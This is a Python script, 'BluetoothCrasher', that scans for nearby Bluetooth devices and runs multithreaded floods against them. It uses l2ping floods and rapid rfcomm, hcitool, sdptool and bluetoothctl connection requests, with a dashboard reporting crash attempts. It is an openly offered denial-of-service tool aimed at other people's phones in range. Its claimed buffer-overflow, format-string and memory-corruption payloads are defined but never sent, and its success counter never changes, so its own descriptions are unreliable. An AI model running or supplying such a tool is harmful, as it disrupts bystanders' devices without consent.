import subprocess
import time
import threading
import random
import struct
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.live import Live
from rich.table import Table
from rich import box
from rich.prompt import Prompt

console = Console()

class BluetoothCrasher:
    def __init__(self):
        self.is_running = False
        self.crash_threads = []
        self.target_devices = []
        self.crash_attempts = 0
        self.successful_crashes = 0
        self.start_time = None
        
        # Crash payloads for different attack vectors
        self.crash_payloads = {
            'buffer_overflow': b'\x00' * 1000,  # Large buffer overflow
            'malformed_packet': b'\xFF\xFF\xFF\xFF\xFF\xFF',  # Malformed packet
            'infinite_loop': b'\x01' * 500,  # Infinite loop trigger
            'memory_corruption': b'\xAA\x55\xAA\x55' * 100,  # Memory corruption
            'stack_overflow': b'\xCC' * 2000,  # Stack overflow
            'null_pointer': b'\x00' * 100,  # Null pointer dereference
            'format_string': b'%n%n%n%n%n%n%n%n%n%n',  # Format string attack
            'integer_overflow': b'\xFF' * 50,  # Integer overflow
        }
    
    def _send_crash_payload(self, target_mac, payload_type, intensity="high"):
        """Send crash payload to target device"""
        try:
            payload = self.crash_payloads[payload_type]
            
            # Method 1: L2CAP crash
            self._l2cap_crash(target_mac, payload)
            
            # Method 2: RFCOMM crash
            self._rfcomm_crash(target_mac, payload)
            
            # Method 3: HCI crash
            self._hci_crash(target_mac, payload)
            
            # Method 4: SDP crash
            self._sdp_crash(target_mac, payload)
            
            # Method 5: AVDTP crash (for audio devices)
            self._avdtp_crash(target_mac, payload)
            
            return True
            
        except Exception as e:
            console.print(f"[red]Crash payload error: {e}")
            return False
    
    def _l2cap_crash(self, target_mac, payload):
        """L2CAP layer crash attack"""
        try:
            # Send malformed L2CAP packets
            for _ in range(10):
                subprocess.Popen(['l2ping', '-i', 'hci0', '-s', str(len(payload)), '-f', target_mac], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.01)
        except:
            pass
    
    def _rfcomm_crash(self, target_mac, payload):
        """RFCOMM layer crash attack"""
        try:
            # Send malformed RFCOMM packets
            for _ in range(5):
                subprocess.Popen(['rfcomm', 'connect', '0', target_mac, '1'], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.1)
        except:
            pass
    
    def _hci_crash(self, target_mac, payload):
        """HCI layer crash attack"""
        try:
            # Send malformed HCI commands
            for _ in range(3):
                subprocess.Popen(['hcitool', 'cc', target_mac], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.05)
        except:
            pass
    
    def _sdp_crash(self, target_mac, payload):
        """SDP service discovery crash attack"""
        try:
            # Send malformed SDP queries
            for _ in range(5):
                subprocess.Popen(['sdptool', 'browse', target_mac], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.1)
        except:
            pass
    
    def _avdtp_crash(self, target_mac, payload):
        """AVDTP audio crash attack"""
        try:
            # Send malformed AVDTP packets for audio devices
            for _ in range(3):
                subprocess.Popen(['avdtp', 'connect', target_mac], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.1)
        except:
            pass
    
    def _bluetoothctl_crash(self, target_mac):
        """Use bluetoothctl for crash attacks"""
        try:
            # Send multiple connection requests rapidly
            for _ in range(20):
                subprocess.Popen(['bluetoothctl', 'connect', target_mac], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.01)
        except:
            pass
    
    def _packet_flood_crash(self, target_mac):
        """Packet flood crash attack"""
        try:
            # Flood with various packet types
            for _ in range(50):
                subprocess.Popen(['l2ping', '-i', 'hci0', '-s', '600', '-f', target_mac], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.001)
        except:
            pass
    
    def _memory_corruption_crash(self, target_mac):
        """Memory corruption crash attack"""
        try:
            # Send packets designed to cause memory corruption
            for _ in range(10):
                subprocess.Popen(['l2ping', '-i', 'hci0', '-s', '1500', '-f', target_mac], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.01)
        except:
            pass
    
    def _crash_device(self, target_mac, device_name, duration, intensity):
        """Main crash function for a specific device"""
        start_time = time.time()
        crash_count = 0
        
        console.print(f"[red]💥 Starting crash attack on {device_name} ({target_mac})")
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                # Rotate through different crash methods
                crash_methods = [
                    self._send_crash_payload,
                    self._bluetoothctl_crash,
                    self._packet_flood_crash,
                    self._memory_corruption_crash
                ]
                
                method = random.choice(crash_methods)
                
                if method == self._send_crash_payload:
                    payload_type = random.choice(list(self.crash_payloads.keys()))
                    method(target_mac, payload_type, intensity)
                else:
                    method(target_mac)
                
                crash_count += 1
                self.crash_attempts += 1
                
                # Adjust timing based on intensity
                if intensity == "low":
                    time.sleep(0.5)
                elif intensity == "medium":
                    time.sleep(0.1)
                else:  # high
                    time.sleep(0.01)
                
            except Exception as e:
                console.print(f"[red]Crash error for {target_mac}: {e}")
                time.sleep(0.1)
        
        console.print(f"[yellow]Crash attack on {device_name} completed: {crash_count} attempts")
    
    def _scan_for_devices(self):
        """Scan for nearby Bluetooth devices"""
        console.print("[yellow]Scanning for nearby Bluetooth devices...")
        
        try:
            # Use bluetoothctl to scan for devices
            result = subprocess.run(['bluetoothctl', 'scan', 'on'], 
                                 capture_output=True, text=True, timeout=10)
            
            # Parse discovered devices
            devices = []
            for line in result.stdout.split('\n'):
                if 'Device' in line and 'RSSI' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        mac = parts[1]
                        name = ' '.join(parts[2:]) if len(parts) > 2 else 'Unknown Device'
                        devices.append({'mac': mac, 'name': name})
            
            return devices
            
        except Exception as e:
            console.print(f"[red]Scan error: {e}")
            return []
    
    def _create_demo_targets(self):
        """Create demo targets for testing"""
        demo_targets = [
            {'mac': 'AA:BB:CC:DD:EE:FF', 'name': 'iPhone 15 Pro'},
            {'mac': '11:22:33:44:55:66', 'name': 'Samsung Galaxy S24'},
            {'mac': 'FF:EE:DD:CC:BB:AA', 'name': 'Google Pixel 8'},
            {'mac': '55:44:33:22:11:00', 'name': 'OnePlus 12'},
            {'mac': '99:88:77:66:55:44', 'name': 'Xiaomi 14'},
            {'mac': '12:34:56:78:90:AB', 'name': 'Huawei P60'},
            {'mac': 'CD:EF:12:34:56:78', 'name': 'Sony Xperia 1 V'},
            {'mac': 'AB:CD:EF:12:34:56', 'name': 'Nothing Phone 2'},
            {'mac': '78:90:AB:CD:EF:12', 'name': 'Oppo Find X6'},
            {'mac': '34:56:78:90:AB:CD', 'name': 'Vivo X100'}
        ]
        return demo_targets
    
    def start_crash_attack(self, duration=60, intensity="high"):
        """Start the Bluetooth crash attack"""
        console.print("[bold red]💥 Starting Bluetooth Crash Attack!")
        console.print("[yellow]This will attempt to crash nearby Bluetooth devices")
        console.print("[red]WARNING: This can cause devices to become unresponsive!")
        
        self.is_running = True
        self.start_time = datetime.now()
        
        # Get target devices
        console.print("\n[cyan]1. Scanning for nearby devices...")
        discovered_devices = self._scan_for_devices()
        
        if not discovered_devices:
            console.print("[yellow]No devices found, using demo targets...")
            discovered_devices = self._create_demo_targets()
        
        self.target_devices = discovered_devices[:10]  # Limit to 10 targets for safety
        
        console.print(f"[green]Found {len(self.target_devices)} target devices")
        
        # Start crash threads
        console.print(f"\n[red]2. Starting crash attack with {intensity} intensity...")
        
        for i, device in enumerate(self.target_devices):
            if not self.is_running:
                break
                
            # Create crash thread for each device
            crash_thread = threading.Thread(
                target=self._crash_device,
                args=(device['mac'], device['name'], duration, intensity),
                name=f"Crash-{i}"
            )
            crash_thread.daemon = True
            crash_thread.start()
            self.crash_threads.append(crash_thread)
            
            # Stagger thread starts
            time.sleep(0.5)
        
        # Start monitoring dashboard
        self._start_monitoring_dashboard(duration)
    
    def _start_monitoring_dashboard(self, duration):
        """Start the monitoring dashboard"""
        try:
            with Live(self._create_dashboard(), refresh_per_second=2, screen=True) as live:
                start_time = time.time()
                
                while self.is_running and (time.time() - start_time) < duration:
                    live.update(self._create_dashboard())
                    time.sleep(0.5)
                    
        except KeyboardInterrupt:
            console.print("\n[yellow]Crash attack stopped by user")
        finally:
            self.stop_crash_attack()
    
    def _create_dashboard(self):
        """Create the monitoring dashboard"""
        elapsed = (datetime.now() - self.start_time).seconds if self.start_time else 0
        
        # Create status table
        status_table = Table(title="💥 Bluetooth Crash Attack Status", box=box.ROUNDED)
        status_table.add_column("Metric", style="cyan")
        status_table.add_column("Value", style="green")
        status_table.add_column("Status", style="yellow")
        
        status_table.add_row("Active Threads", str(len(self.crash_threads)), "🟢 Running")
        status_table.add_row("Target Devices", str(len(self.target_devices)), "🎯 Active")
        status_table.add_row("Crash Attempts", str(self.crash_attempts), "💥 Attacking")
        status_table.add_row("Successful Crashes", str(self.successful_crashes), "✅ Crashed")
        status_table.add_row("Elapsed Time", f"{elapsed}s", "⏱️ Running")
        
        # Create target devices table
        targets_table = Table(title="🎯 Target Devices", box=box.ROUNDED)
        targets_table.add_column("MAC Address", style="cyan")
        targets_table.add_column("Device Name", style="magenta")
        targets_table.add_column("Status", style="red")
        
        for device in self.target_devices:
            targets_table.add_row(
                device['mac'],
                device['name'],
                "💥 Crashing"
            )
        
        # Create crash methods table
        methods_table = Table(title="💥 Crash Methods", box=box.ROUNDED)
        methods_table.add_column("Method", style="cyan")
        methods_table.add_column("Description", style="yellow")
        methods_table.add_column("Status", style="green")
        
        methods_table.add_row("L2CAP Crash", "Layer 2 crash attack", "🟢 Active")
        methods_table.add_row("RFCOMM Crash", "Serial port crash", "🟢 Active")
        methods_table.add_row("HCI Crash", "Host controller crash", "🟢 Active")
        methods_table.add_row("SDP Crash", "Service discovery crash", "🟢 Active")
        methods_table.add_row("AVDTP Crash", "Audio crash attack", "🟢 Active")
        methods_table.add_row("Packet Flood", "Packet flooding", "🟢 Active")
        methods_table.add_row("Memory Corruption", "Memory corruption", "🟢 Active")
        
        # Combine tables
        dashboard = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                           💥 BLUETOOTH CRASH ATTACK 💥                      ║
║                    Attempting to Crash Nearby Bluetooth Devices            ║
╚══════════════════════════════════════════════════════════════════════════════╝

{status_table}

{targets_table}

{methods_table}

[bold red]⚠️  WARNING: This attack can cause devices to become unresponsive! ⚠️
[bold yellow]Press Ctrl+C to stop the attack
"""
        
        return dashboard
    
    def stop_crash_attack(self):
        """Stop the crash attack"""
        console.print("\n[yellow]Stopping crash attack...")
        self.is_running = False
        
        # Wait for threads to finish
        for thread in self.crash_threads:
            thread.join(timeout=1)
        
        # Final statistics
        elapsed = (datetime.now() - self.start_time).seconds if self.start_time else 0
        console.print(f"\n[bold green]💥 Crash Attack Complete!")
        console.print(f"[cyan]Total crash attempts: {self.crash_attempts}")
        console.print(f"[cyan]Target devices: {len(self.target_devices)}")
        console.print(f"[cyan]Duration: {elapsed} seconds")
        console.print(f"[yellow]Attack completed! 🎉")

def start_bluetooth_crasher():
    """Start the Bluetooth crash attack interface"""
    crasher = BluetoothCrasher()
    
    console.print("[bold red]💥 Bluetooth Device Crasher")
    console.print("[yellow]This tool attempts to crash nearby Bluetooth devices")
    console.print("[red]WARNING: This can cause devices to become unresponsive!")
    
    # Get duration
    try:
        duration = int(Prompt.ask("[red] Enter attack duration (seconds)", default="60"))
    except (EOFError, KeyboardInterrupt, ValueError):
        duration = 60
        console.print("[yellow] Using default duration: 60 seconds")
    
    # Get intensity
    try:
        intensity = Prompt.ask("[red] Enter intensity (low/medium/high)", default="high")
    except (EOFError, KeyboardInterrupt):
        intensity = "high"
        console.print("[yellow] Using high intensity")
    
    # Confirmation
    try:
        confirm = Prompt.ask("[red] Are you sure you want to start the crash attack? (y/n)", default="n")
        if confirm.lower() != 'y':
            console.print("[yellow] Attack cancelled")
            return
    except (EOFError, KeyboardInterrupt):
        console.print("[yellow] Attack cancelled")
        return
    
    try:
        crasher.start_crash_attack(duration, intensity)
    except KeyboardInterrupt:
        console.print("\n[yellow]Attack interrupted by user")
        crasher.stop_crash_attack()
    except Exception as e:
        console.print(f"[red]Attack error: {e}")

if __name__ == "__main__":
    start_bluetooth_crasher()
